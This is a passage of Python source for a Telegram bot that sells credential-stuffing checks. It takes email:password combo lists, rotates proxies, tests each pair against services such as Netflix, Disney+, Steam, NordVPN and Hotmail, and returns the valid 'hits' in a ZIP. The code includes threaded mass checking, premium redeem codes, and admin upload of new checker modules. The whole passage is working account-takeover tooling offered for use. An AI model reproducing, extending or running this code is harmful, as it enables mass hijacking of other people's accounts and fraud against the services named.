            f"{EMOJIS['time']} Processing... {EMOJIS['time']}\n"
            f"Tap Stop or send /stop — ZIP with hits will be sent.",
            reply_markup=stop_kb,
        )
        threading.Thread(target=run_mass_check, args=(user_id, combos, proxies, threads, checker_type, checker_id, filename), daemon=True).start()
        if filename and os.path.exists(filename): os.remove(filename)
    except ValueError:
        msg = bot.send_message(user_id, f"{EMOJIS['error']} Invalid number. Send a valid number: {EMOJIS['error']}"); bot.register_next_step_handler(msg, handle_thread_selection)

def handle_single_check(message, checker_type, checker_id):
    user_id = message.from_user.id
    if message.text and message.text == "/cancel":
        bot.send_message(user_id, e_line("Cancelled", "error", "no", 1)); return
    combo = message.text.strip()
    if ":" not in combo:
        msg = bot.send_message(user_id, f"{EMOJIS['error']} Invalid format! Use <code>identifier:password</code> {EMOJIS['error']}", parse_mode='HTML')
        bot.register_next_step_handler(msg, handle_single_check, checker_type=checker_type, checker_id=checker_id); return
    identifier, password = combo.split(":", 1)
    bot.send_message(user_id, f"{EMOJIS['time']} Checking... {EMOJIS['time']}")
    try:
        # proxies mandatory: try load from proxies.txt next to bot
        proxies = []
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8", errors="ignore") as pf:
                for line in pf:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith("http"):
                            parts = line.split(":")
                            if len(parts) == 4:
                                line = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                            else:
                                line = f"http://{line}"
                        proxies.append(line)
        proxy = safe_choice(proxies, None)
        rotations = 1
        result = None
        last_err = None
        for attempt in range(1):
            try:
                result = run_checker_logic(checker_id, identifier.strip(), password.strip(), proxy)
                st = str(result.get("status", "")).lower()
                if st not in ("error", "timeout", "rate_limit", "retry"):
                    rotations = attempt + 1
                    break
                last_err = result
                BAD = set()
                # rotate proxy
                proxy = safe_choice(proxies, None)
                rotations = attempt + 1
                pass
            except Exception as e:
                last_err = {"status": "error", "message": str(e)[:80]}
                proxy = safe_choice(proxies, None)
                rotations = attempt + 1
                pass
        if result is None:
            result = last_err or {"status": "error", "message": "Unknown"}
        status = str(result.get("status", "error")).lower()
        if status in ["premium", "hit", "valid"]:
            if checker_id == "multichecker" and "results" in result:
                stxt = f"{EMOJIS['success']} HIT (Multi)\n"
                for pname, pres in result["results"].items():
                    pstatus = pres.get("status", "?")
                    if pstatus in ("premium", "hit", "valid"):
                        stxt += f"  ✅ {pname}: {pres.get('message', '')}\n"
                    elif pstatus == "2fa":
                        stxt += f"  🔐 {pname}: 2FA\n"
                    elif pstatus == "free":
                        stxt += f"  📄 {pname}: Free\n"
                    else:
                        stxt += f"  ❌ {pname}: {pstatus}\n"
                bot.send_message(user_id, stxt + f"\nMade By ➜ {CONTACT_ADMIN}", parse_mode="HTML")
            else:
                msg = format_hit_message(identifier.strip(), password.strip(), result, checker_type, rotations)
                bot.send_message(user_id, msg, parse_mode="HTML")
        elif status in ["free", "expired"]:
            msg = format_hit_message(identifier.strip(), password.strip(), result, checker_type, rotations)
            bot.send_message(user_id, msg, parse_mode="HTML")
        elif status in ["bad", "invalid", "ban"]:
            bot.send_message(user_id, f"{EMOJIS['error']} <b>BAD</b>\nAccount ➜ <code>{identifier}:{password}</code>\nResponse ➜ {result.get('message', 'Invalid')}\n\nMade By ➜ {CONTACT_ADMIN}", parse_mode="HTML")
        elif status == "2fa":
            bot.send_message(user_id, f"{EMOJIS['crown']} <b>2FA REQUIRED</b>\nAccount ➜ <code>{identifier}:{password}</code>\n\nMade By ➜ {CONTACT_ADMIN}", parse_mode="HTML")
        else:
            bot.send_message(user_id, f"{EMOJIS['warn']} <b>ERROR</b>\nAccount ➜ <code>{identifier}:{password}</code>\nResponse ➜ {result.get('message', result.get('error', 'Unknown'))}\n\nMade By ➜ {CONTACT_ADMIN}", parse_mode="HTML")
        update_last_check(user_id)
    except Exception as e:
        bot.send_message(user_id, f"{EMOJIS['error']} Error: {e} {EMOJIS['error']}")
def handle_redeem(message):
    user_id = message.from_user.id
    if message.text and message.text == "/cancel":
        bot.send_message(user_id, e_line("Cancelled", "error", "no", 1)); return
    code = message.text.strip()
    codes = load_redeem_codes()
    if code not in codes:
        bot.send_message(user_id, f"{EMOJIS['error']} Invalid code! {EMOJIS['error']}"); return
    cdata = codes[code]
    if cdata.get("used"):
        bot.send_message(user_id, f"{EMOJIS['error']} Code already used! {EMOJIS['error']}"); return
    if cdata.get("expires") and datetime.fromisoformat(cdata["expires"]) < datetime.now():
        bot.send_message(user_id, f"{EMOJIS['error']} Code expired! {EMOJIS['error']}"); return
    days = cdata.get("days", 30)
    users = load_users()
    uid = str(user_id)
    users[uid]["is_premium"] = True
    users[uid]["premium_expiry"] = (datetime.now() + timedelta(days=days)).isoformat()
    save_users(users)
    cdata["used"] = True; cdata["used_by"] = user_id; cdata["used_at"] = datetime.now().isoformat()
    save_redeem_codes(codes)
    bot.send_message(user_id, f"{EMOJIS['diamond']} {EMOJIS['diamond']} Premium Activated! {EMOJIS['diamond']} {EMOJIS['diamond']}\n{EMOJIS['success']} Duration: {days} days {EMOJIS['success']}\n Expires: {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M')}")

# ==================== CHECKER LOGIC ====================
def run_checker_logic(checker_id, email, password, proxy):
    if checker_id == "dazn":
        return DAZNChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "deezer":
        return DeezerChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "disney":
        return DisneyChecker(proxy=proxy).check(email, password)
    elif checker_id == "hotspotshield":
        return HotspotShieldChecker(proxy=proxy).check(email, password)
    elif checker_id == "nordvpn":
        return NordVPNChecker(proxy=proxy).check(email, password)
    elif checker_id == "steam":
        return SteamChecker(proxy=proxy).check(email, password)
    elif checker_id == "expressvpn":
        return ExpressVPNChecker(proxy=proxy).check(email, password)
    elif checker_id == "crunchyroll":
        return CrunchyrollChecker(proxy=proxy).check(email, password)
    elif checker_id == "xbox":
        return XboxChecker(proxy=proxy).check(email, password)
    elif checker_id == "hotmail":
        return HotmailChecker(proxy=proxy).check(email, password)
    elif checker_id == "nba":
        return NBAChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "paramount":
        return ParamountChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "netflix":
        return NetflixChecker(proxy=proxy).check(email, password)
    elif checker_id == "viki":
        return VikiChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "pluto":
        return PlutoChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "plex":
        return PlexChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "peacock":
        return PeacockChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "tabii":
        return TabiiChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "playabl":
        return PlayablChecker(proxy=proxy).check(email, password, proxy)
    elif checker_id == "multichecker":
        return MultiChecker(proxy=proxy).check(email, password)
    else:
        settings = load_bot_settings()
        checker_info = next((c for c in settings.get("custom_checkers", []) if c["id"] == checker_id), None)
        if not checker_info:
            return {"status": "error", "message": "Checker not found"}
        
        loaded = load_custom_checker_module(checker_info["file"], checker_info["module_name"])
        if not loaded:
            return {"status": "error", "message": "Failed to load checker file"}
        
        checker_class, method_name = loaded
        
        try:
            init_sig = inspect.signature(checker_class.__init__)
            init_params = list(init_sig.parameters.keys())
            
            if 'proxy' in init_params:
                instance = checker_class(proxy=proxy)
            elif 'proxy_manager' in init_params:
                instance = checker_class()
            else:
                instance = checker_class()
            
            method = getattr(instance, method_name)
            sig = inspect.signature(method)
            params = list(sig.parameters.keys())
            
            if 'email' in params and 'password' in params:
                return method(email, password)
            elif 'combo' in params:
                return method(f"{email}:{password}")
            else:
                return method(email, password)
        except Exception as e:
            return {"status": "error", "message": str(e)}




def run_mass_check(user_id, combos, proxies, threads, checker_type, checker_id, filename=None):
    """Mass check with reliable /stop, plain progress, per-combo timeout."""
    stopped = False
    job_key = None
    stop_event = threading.Event()
    try:
        job_key = register_job(user_id)
        with RUNNING_JOBS_LOCK:
            job = RUNNING_JOBS.get(job_key)
            if isinstance(job, dict):
                job["event"] = stop_event

        results = {"hits": [], "free": [], "bad": [], "errors": [], "twofa": []}
        stats = {"checked": 0, "hits": 0, "free": 0, "bad": 0, "errors": 0, "twofa": 0}
        lock = threading.Lock()
        hit_queue = []

        def _hit_sender():
            while True:
                item = None
                with lock:
                    if hit_queue:
                        item = hit_queue.pop(0)
                if item is None:
                    if getattr(_hit_sender, "_stop", False) and not hit_queue:
                        break
                    time.sleep(0.03)
                    continue
                kind, email, password, result = item
                try:
                    hit_msg = format_hit_message(email, password, result, checker_type, 1)
                    bot.send_message(user_id, hit_msg, parse_mode="HTML")
                except Exception:
                    try:
                        bot.send_message(user_id, f"{kind.upper()} {email}:{password}")
                    except Exception:
                        pass

        _hit_sender._stop = False
        _hit_thread = threading.Thread(target=_hit_sender, daemon=True)
        _hit_thread.start()

        proxies = list(proxies or [])
        combos = [c for c in (combos or []) if c and str(c).strip()]
        total_combos = len(combos)
        if total_combos == 0:
            bot.send_message(user_id, "No valid combos to check.")
            return

        platform_hits = {}
        platform_free = {}
        if checker_id == "multichecker":
            try:
                keys = list(MultiChecker(None).checkers.keys())
                platform_hits = {name: 0 for name in keys}
                platform_free = {name: 0 for name in keys}
            except Exception:
                platform_hits = {}
                platform_free = {}

        start_time = time.time()

        def progress_text(html=True):
            elapsed = max(0.1, time.time() - start_time)
            cpm = int(stats["checked"] / elapsed * 60)
            stop_note = " | STOPPING..." if (stopped or stop_event.is_set()) else ""
            if html:
                text = (
                    f"{EMOJIS.get('stats','📊')} <b>Progress</b> {EMOJIS.get('stats','📊')}{stop_note}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"{EMOJIS.get('success','✅')} Checked: {stats['checked']}/{total_combos} {EMOJIS.get('success','✅')}\n"
                    f"{EMOJIS.get('target','💠')} Hits: {stats['hits']} {EMOJIS.get('target','💠')}\n"
                    f"{EMOJIS.get('unlock','🔓')} Free: {stats['free']} {EMOJIS.get('unlock','🔓')}\n"
                    f"{EMOJIS.get('error','🚫')} Bad: {stats['bad']} {EMOJIS.get('error','🚫')}\n"
                    f"{EMOJIS.get('warn','⚠️')} Errors: {stats['errors']} {EMOJIS.get('warn','⚠️')}\n"
                    f"{EMOJIS.get('crown','👑')} 2FA: {stats['twofa']} {EMOJIS.get('crown','👑')}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"{EMOJIS.get('speed','⚡')} CPM: {cpm} {EMOJIS.get('speed','⚡')}\n"
                    f"{EMOJIS.get('warn','⏹')} Send /stop or tap Stop for ZIP"
                )
                if checker_id == "multichecker":
                    plat_h = [f"  {p}: {c}" for p, c in platform_hits.items() if c > 0]
                    plat_f = [f"  {p}: {c}" for p, c in platform_free.items() if c > 0]
                    if plat_h:
                        text += f"\n{EMOJIS.get('star','🌟')} Platform Hits:\n" + "\n".join(plat_h)
                    if plat_f:
                        text += f"\n{EMOJIS.get('unlock','🔓')} Platform Free:\n" + "\n".join(plat_f)
                return text
            text = (
                f"{plain_e('stats','📊')} Progress {plain_e('stats','📊')}{stop_note}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{plain_e('success','✅')} Checked: {stats['checked']}/{total_combos} {plain_e('success','✅')}\n"
                f"{plain_e('target','💠')} Hits: {stats['hits']} {plain_e('target','💠')}\n"
                f"{plain_e('unlock','🔓')} Free: {stats['free']} {plain_e('unlock','🔓')}\n"
                f"{plain_e('error','🚫')} Bad: {stats['bad']} {plain_e('error','🚫')}\n"
                f"{plain_e('warn','⚠️')} Errors: {stats['errors']} {plain_e('warn','⚠️')}\n"
                f"{plain_e('crown','👑')} 2FA: {stats['twofa']} {plain_e('crown','👑')}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{plain_e('speed','⚡')} CPM: {cpm} {plain_e('speed','⚡')}\n"
                f"{plain_e('warn','⏹')} Send /stop or tap Stop for ZIP"
            )
            if checker_id == "multichecker":
                plat_h = [f"{p}:{c}" for p, c in platform_hits.items() if c > 0]
                plat_f = [f"{p}:{c}" for p, c in platform_free.items() if c > 0]
                if plat_h:
                    text += "\nPlatform Hits: " + ", ".join(plat_h)
                if plat_f:
                    text += "\nPlatform Free: " + ", ".join(plat_f)
            return text

        progress_id = None
        use_html = True
        try:
            progress_msg = bot.send_message(user_id, progress_text(True), parse_mode="HTML")
            progress_id = progress_msg.message_id
        except Exception:
            use_html = False
            try:
                progress_msg = bot.send_message(user_id, progress_text(False))
                progress_id = progress_msg.message_id
            except Exception:
                progress_id = None

        last_progress = {"t": 0.0}

        def update_progress(force=False):
            if progress_id is None:
                return
            now = time.time()
            if not force and (now - last_progress["t"]) < 0.8:
                return
            last_progress["t"] = now
            def _do():
                try:
                    if use_html:
                        bot.edit_message_text(progress_text(True), user_id, progress_id, parse_mode="HTML")
                    else:
                        bot.edit_message_text(progress_text(False), user_id, progress_id)
                except Exception:
                    try:
                        bot.edit_message_text(progress_text(False), user_id, progress_id)
                    except Exception:
                        pass
            try:
                threading.Thread(target=_do, daemon=True).start()
            except Exception:
                _do()

        def should_stop():
            if stop_event.is_set():
                return True
            with RUNNING_JOBS_LOCK:
                uid = int(user_id)
                for k, v in list(RUNNING_JOBS.items()):
                    try:
                        if int(str(k).split(":")[0]) == uid and isinstance(v, dict):
                            if v.get("stop"):
                                stop_event.set()
                                return True
                            ev = v.get("event")
                            if ev is not None and getattr(ev, "is_set", lambda: False)():
                                return True
                    except Exception:
                        pass
            return False

        def run_one(email, password, proxy):
            return run_checker_logic(checker_id, email, password, proxy)

        def check_combo(combo):
            nonlocal stopped
            if should_stop():
                stopped = True
                return
            try:
                combo = str(combo).strip()
                if ":" not in combo:
                    with lock:
                        stats["checked"] += 1
                        stats["errors"] += 1
                        results["errors"].append(f"{combo} - Invalid format")
                        update_progress()
                    return
                email, password = combo.split(":", 1)
                email, password = email.strip(), password.strip()
                if not email or not password:
                    with lock:
                        stats["checked"] += 1
                        stats["errors"] += 1
                        results["errors"].append(f"{combo} - Empty")
                        update_progress()
                    return

                proxy = safe_choice(proxies, None)
                result = None
                try:
                    # direct call — no nested pool (nested pool killed CPM)
                    result = run_one(email, password, proxy)
                except Exception as _e:
                    result = {"status": "error", "message": str(_e)[:120]}

                if result is None:
                    result = {"status": "error", "message": "No result"}

                with lock:
                    stats["checked"] += 1
                    status = str(result.get("status", "error")).lower()
                    if status in ("premium", "hit", "valid", "success"):
                        stats["hits"] += 1
                        results["hits"].append({"combo": combo, "result": result})
                        if checker_id == "multichecker" and isinstance(result.get("results"), dict):
                            for pname, pres in result["results"].items():
                                st = str((pres or {}).get("status", "")).lower()
                                if st in ("premium", "hit", "valid", "success"):
                                    platform_hits[pname] = platform_hits.get(pname, 0) + 1
                                elif st in ("free", "expired"):
                                    platform_free[pname] = platform_free.get(pname, 0) + 1
                        hit_queue.append(("hit", email, password, result))
                    elif status in ("free", "expired"):
                        stats["free"] += 1
                        results["free"].append({"combo": combo, "result": result})
                        if checker_id == "multichecker" and isinstance(result.get("results"), dict):
                            for pname, pres in result["results"].items():
                                st = str((pres or {}).get("status", "")).lower()
                                if st in ("free", "expired"):
                                    platform_free[pname] = platform_free.get(pname, 0) + 1
                                elif st in ("premium", "hit", "valid", "success"):
                                    platform_hits[pname] = platform_hits.get(pname, 0) + 1
                        hit_queue.append(("free", email, password, result))
                    elif status in ("bad", "invalid", "ban"):
                        stats["bad"] += 1
                        results["bad"].append(combo)
                    elif status == "2fa":
                        stats["twofa"] += 1
                        results["twofa"].append(combo)
                    else:
                        stats["errors"] += 1
                        results["errors"].append(
                            f"{combo} - {result.get('message', result.get('error', 'Unknown'))}"
                        )
                    if stats["checked"] <= 10 or stats["checked"] % 5 == 0 or stats["checked"] == total_combos:
                        update_progress()
            except Exception as e:
                with lock:
                    stats["checked"] += 1
                    stats["errors"] += 1
                    results["errors"].append(f"{combo} - {str(e)[:120]}")
                    update_progress()
                logger.error("check_combo crash: %s", e)

        # multi runs many platforms per combo — keep outer pool small to avoid freeze
        max_w = 8 if checker_id == "multichecker" else 80
        workers = max(1, min(int(threads or 1), max_w))
        from concurrent.futures import as_completed, wait, FIRST_COMPLETED
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futs = []
            for c in combos:
                if should_stop():
                    stopped = True
                    break
                futs.append(executor.submit(check_combo, c))
            pending = set(futs)
            while pending:
                if should_stop():
                    stopped = True
                    for f in pending:
                        f.cancel()
                    break
                done, pending = wait(pending, timeout=2.0, return_when=FIRST_COMPLETED)
                for fut in done:
                    try:
                        fut.result(timeout=0.1)
                    except Exception:
                        pass
        update_progress(force=True)

        stopped = stopped or should_stop()
        _hit_sender._stop = True
        try:
            _hit_thread.join(timeout=20)
        except Exception:
            pass
        update_progress(force=True)

        try:
            update_last_check(user_id)
        except Exception:
            pass

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_dir = f"results_{user_id}_{timestamp}"
        os.makedirs(result_dir, exist_ok=True)
        for category, data in results.items():
            if not data:
                continue
            try:
                with open(os.path.join(result_dir, f"{category.upper()}.txt"), "w", encoding="utf-8") as f:
                    f.write("# " + plain_e("success", "✅") + " " + category.upper() + " | by " + str(CONTACT_ADMIN) + "\n")
                    for item in data:
                        if isinstance(item, dict):
                            combo_s = item.get("combo", "")
                            res = item.get("result") or {}
                            zline = res.get("zip_line") or res.get("hit_line")
                            if not zline and ":" in str(combo_s):
                                try:
                                    em, pw = str(combo_s).split(":", 1)
                                    zline = format_zip_style_hit(em, pw, res, checker_type)
                                except Exception:
                                    zline = f"{combo_s} | Checked by {CONTACT_ADMIN}"
                            f.write((zline or f"{combo_s} | Checked by {CONTACT_ADMIN}") + "\n")
                        else:
                            f.write(f"{item}\n")
            except Exception as e:
                logger.error("write results %s: %s", category, e)

        zip_filename = f"{checker_type}_Results_{timestamp}.zip"
        try:
            with zipfile.ZipFile(zip_filename, "w") as zipf:
                for root, _, files in os.walk(result_dir):
                    for file in files:
                        zipf.write(os.path.join(root, file), file)
        except Exception as e:
            logger.error("zip failed: %s", e)
            zip_filename = None

        elapsed = time.time() - start_time
        status_word = "STOPPED" if stopped else "Complete"
        caption_html = (
            f"{E('success')} <b>Check {status_word}!</b> {E('success')}\n"
            f"{E('target')} Hits: <b>{stats['hits']}</b>\n"
            f"{E('unlock')} Free: <b>{stats['free']}</b>\n"
            f"{E('error')} Bad: <b>{stats['bad']}</b>\n"
            f"{E('warn')} Errors: <b>{stats['errors']}</b>\n"
            f"{E('crown')} 2FA: <b>{stats['twofa']}</b>\n"
            f"{E('stats')} Checked: <b>{stats['checked']}/{total_combos}</b>\n"
            f"{E('speed')} Time: <b>{elapsed:.1f}s</b>"
        )
        caption_plain = (
            f"{plain_e('success','✅')} Check {status_word}! {plain_e('success','✅')}\n"
            f"{plain_e('target','💠')} Hits: {stats['hits']}\n"
            f"{plain_e('unlock','🔓')} Free: {stats['free']}\n"
            f"{plain_e('error','🚫')} Bad: {stats['bad']}\n"
            f"{plain_e('warn','⚠️')} Errors: {stats['errors']}\n"
            f"{plain_e('crown','👑')} 2FA: {stats['twofa']}\n"
            f"{plain_e('stats','📊')} Checked: {stats['checked']}/{total_combos}\n"
            f"{plain_e('speed','⚡')} Time: {elapsed:.1f}s"
        )
        try:
            if zip_filename and os.path.exists(zip_filename):
                with open(zip_filename, "rb") as zf:
                    try:
                        bot.send_document(user_id, zf, caption=caption_html, parse_mode="HTML")
                    except Exception:
                        zf.seek(0)
                        bot.send_document(user_id, zf, caption=caption_plain)
            else:
                try:
                    bot.send_message(user_id, caption_html, parse_mode="HTML")
                except Exception:
                    bot.send_message(user_id, caption_plain)
        except Exception as e:
            logger.error("send results: %s", e)
            try:
                bot.send_message(user_id, caption_plain)
            except Exception:
                pass

        try:
            if zip_filename and os.path.exists(zip_filename):
                os.remove(zip_filename)
            if os.path.isdir(result_dir):
                shutil.rmtree(result_dir, ignore_errors=True)
        except Exception:
            pass

    except Exception as e:
        logger.exception("run_mass_check fatal: %s", e)
        try:
            bot.send_message(user_id, f"Check error: {str(e)[:180]}")
        except Exception:
            pass
    finally:
        try:
            if job_key is not None:
                clear_job(job_key)
            else:
                clear_job(int(user_id))
        except Exception:
            pass




@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    uid = message.from_user.id
    if count_user_jobs(uid) <= 0:
        bot.reply_to(message, "No active check running.")
        return
    set_job_stop(uid)
    bot.reply_to(message, "Stop requested — ZIP of results so far will be sent.")


@bot.callback_query_handler(func=lambda call: call.data == "stop_check")
def cb_stop_check(call):
    uid = call.from_user.id
    try:
        bot.answer_callback_query(call.id, "Stopping...")
    except Exception:
        pass
    if count_user_jobs(uid) <= 0:
        try:
            bot.send_message(uid, "No active check.")
        except Exception:
            pass
        return
    set_job_stop(uid)
    try:
        bot.send_message(uid, "Stop requested — ZIP with hits will be sent.")
    except Exception:
        pass



def handle_admin_user_mgmt(message, is_add):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Operation cancelled. {EMOJIS['error']}")
        return

    uid = message.text.strip()
    
    if not uid.isdigit():
        bot.send_message(
            message.chat.id,
            f"{EMOJIS['error']} Invalid ID. Please send a numeric Telegram ID (e.g., 123456789). {EMOJIS['error']}"
        )
        return

    admins = load_admins()
    try:
        if is_add:
            if uid in admins:
                bot.send_message(message.chat.id, f"{EMOJIS['warn']} User `{uid}` is already an admin. {EMOJIS['warn']}", parse_mode='HTML')
                return
            admins[uid] = True
            save_admins(admins)
            bot.send_message(
                message.chat.id,
                f"{EMOJIS['success']} User `{uid}` has been **added** as an admin. {EMOJIS['success']}",
                parse_mode='HTML'
            )
        else:
            if uid == str(MAIN_ADMIN_ID):
                bot.send_message(message.chat.id, f"{EMOJIS['error']} Cannot remove the main admin. {EMOJIS['error']}")
                return
            if uid not in admins:
                bot.send_message(message.chat.id, f"{EMOJIS['error']} User `{uid}` is not an admin. {EMOJIS['error']}", parse_mode='HTML')
                return
            del admins[uid]
            save_admins(admins)
            bot.send_message(
                message.chat.id,
                f"{EMOJIS['success']} User `{uid}` has been **removed** from admin list. {EMOJIS['success']}",
                parse_mode='HTML'
            )
    except Exception as e:
        logger.error(f"Admin management error: {e}")
        bot.send_message(
            message.chat.id,
            f"{EMOJIS['error']} An error occurred: {e}. Please try again. {EMOJIS['error']}"
        )

# --- END OF ADMIN FIX ---

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_checker")
def admin_add_checker_start(call):
    if not is_admin(call.from_user.id): return
    msg = bot.send_message(call.message.chat.id, f"{EMOJIS['add']} <b>Add New Checker</b> {EMOJIS['add']}\n\nSend the <b>name</b> of the checker (e.g., Netflix, Spotify):\n\nType /cancel to cancel", parse_mode='HTML')
    bot.register_next_step_handler(msg, handle_checker_name)

def handle_checker_name(message):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    checker_name = message.text.strip()
    msg = bot.send_message(message.chat.id, f"{EMOJIS['success']} Name saved: <b>{checker_name}</b> {EMOJIS['success']}\n\nNow send the <b>.py file</b> for the checker.\n\n<i>Note: The file must contain a class with a check/check_account method.</i>", parse_mode='HTML')
    bot.register_next_step_handler(msg, handle_checker_file, checker_name=checker_name)

def handle_checker_file(message, checker_name):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    if not message.document or not message.document.file_name.endswith('.py'):
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Please send a valid .py file! {EMOJIS['error']}"); return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        module_name = f"checker_{uuid.uuid4().hex[:8]}"
        filename = f"{module_name}.py"
        file_path = os.path.join(CUSTOM_CHECKERS_DIR, filename)
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        loaded = load_custom_checker_module(file_path, module_name)
        if not loaded:
            os.remove(file_path)
            bot.send_message(message.chat.id, f"{EMOJIS['error']} Failed to load checker! Ensure it has a class with a check/check_account method. {EMOJIS['error']}"); return
        checker_class, method_name = loaded
        
        settings = load_bot_settings()
        checker_id = uuid.uuid4().hex[:8]
        settings["custom_checkers"].append({
            "id": checker_id,
            "name": checker_name,
            "file": file_path,
            "module_name": module_name,
            "method_name": method_name
        })
        save_bot_settings(settings)
        bot.send_message(message.chat.id, f"{EMOJIS['success']} Checker <b>{checker_name}</b> added successfully! (Method: {method_name}) {EMOJIS['success']}", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Error: {str(e)} {EMOJIS['error']}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_remove_checker")
def admin_remove_checker_start(call):
    if not is_admin(call.from_user.id): return
    settings = load_bot_settings()
    checkers = settings.get("custom_checkers", [])
    
    if not checkers:
        bot.send_message(call.message.chat.id, f"{EMOJIS['warn']} No custom checkers to remove! {EMOJIS['warn']}")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for checker in checkers:
        markup.add(types.InlineKeyboardButton(f" {checker['name']}", callback_data=f"remove_checker_{checker['id']}"))
    markup.add(ikb("Back", callback_data="admin_back", style="danger"))
    
    bot.send_message(call.message.chat.id, f"{EMOJIS['remove']} <b>Select checker to remove:</b> {EMOJIS['remove']}", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("remove_checker_"))
def admin_remove_checker_confirm(call):
    if not is_admin(call.from_user.id): return
    checker_id = call.data.replace("remove_checker_", "")
    settings = load_bot_settings()
    checkers = settings.get("custom_checkers", [])
    
    checker_info = next((c for c in checkers if c["id"] == checker_id), None)
    if not checker_info:
        bot.answer_callback_query(call.id, f"{EMOJIS['error']} Checker not found! {EMOJIS['error']}", show_alert=True)
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        ikb("Yes, Remove", callback_data=f"confirm_remove_{checker_id}", style="danger"),
        ikb("Cancel", callback_data="admin_remove_checker", style="primary")
    )
    
    bot.send_message(call.message.chat.id, f"{EMOJIS['warn']} Are you sure you want to remove <b>{checker_info['name']}</b>? {EMOJIS['warn']}", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_remove_"))
def admin_remove_checker_confirm_action(call):
    if not is_admin(call.from_user.id): return
    checker_id = call.data.replace("confirm_remove_", "")
    settings = load_bot_settings()
    checkers = settings.get("custom_checkers", [])
    
    checker_info = next((c for c in checkers if c["id"] == checker_id), None)
    if not checker_info:
        bot.answer_callback_query(call.id, f"{EMOJIS['error']} Checker not found! {EMOJIS['error']}", show_alert=True)
        return
    
    settings["custom_checkers"] = [c for c in checkers if c["id"] != checker_id]
    save_bot_settings(settings)
    
    file_path = checker_info.get("file", "")
    if file_path and os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass
    
    bot.send_message(call.message.chat.id, f"{EMOJIS['success']} Checker <b>{checker_info['name']}</b> removed successfully! {EMOJIS['success']}", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_forcejoin")
def admin_add_forcejoin_start(call):
    if not is_admin(call.from_user.id): return
    msg = bot.send_message(call.message.chat.id, f"{EMOJIS['channel']} <b>Add Force Join Channel</b> {EMOJIS['channel']}\n\nSend the channel username (e.g., @networkboyou) or channel link.\n\n<i>Note: Bot MUST be an admin in the channel.</i>", parse_mode='HTML')
    bot.register_next_step_handler(msg, handle_forcejoin_input)

def handle_forcejoin_input(message):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    channel_input = message.text.strip()
    bot.send_message(message.chat.id, f"{EMOJIS['search']} Detecting channel type and generating link... {EMOJIS['search']}")
    try:
        chat = bot.get_chat(channel_input)
        if chat.username:
            link = f"https://t.me/{chat.username}"
            ch_type = "public"
        else:
            invite_link = bot.create_chat_invite_link(chat.id, member_limit=1, name="Bot Force Join").invite_link
            link = invite_link
            ch_type = "private"
        settings = load_bot_settings()
        settings["force_join_channels"].append({
            "id": chat.id,
            "username": chat.username or chat.title,
            "link": link,
            "type": ch_type
        })
        save_bot_settings(settings)
        bot.send_message(message.chat.id, f"{EMOJIS['success']} Channel added successfully! {EMOJIS['success']}\n\n<b>Name:</b> {chat.title}\n<b>Type:</b> {ch_type}\n<b>Link:</b> {link}", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Error: {str(e)}\n\nMake sure the bot is an admin in the channel. {EMOJIS['error']}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_set_media")
def admin_set_media_menu(call):
    if not is_admin(call.from_user.id): return
    markup = types.InlineKeyboardMarkup(row_width=2)
    sections = [
        ("welcome", "Welcome Screen"),
        ("checkers", "Checkers Menu"),
        ("dazn", "DAZN Checker"),
        ("deezer", "Deezer Checker"),
        ("disney", "Disney+ Checker"),
        ("hotspotshield", "Hotspot Shield"),
        ("nordvpn", "NordVPN Checker"),
        ("steam", "Steam Checker"),
        ("expressvpn", "ExpressVPN Checker"),
        ("crunchyroll", "Crunchyroll Checker"),
        ("xbox", "Xbox Checker"),
        ("hotmail", "Hotmail Checker"),
        ("netflix", "Netflix Checker"),
        ("pluto", "Pluto TV Checker"),
        ("plex", "Plex Checker"),
        ("peacock", "Peacock Checker"),
        ("tabii", "Tabii Checker"),
        ("playabl", "Playabl Checker"),
        ("multichecker", "Multi-Checker"),
        ("stats", "Stats"),
        ("redeem", "Redeem"),
        ("admin_panel", "Admin Panel"),
        ("cooldown", "Cooldown (Sticker)"),
        ("hit", "Hit (Sticker)"),
        ("force_join", "Force Join Screen"),
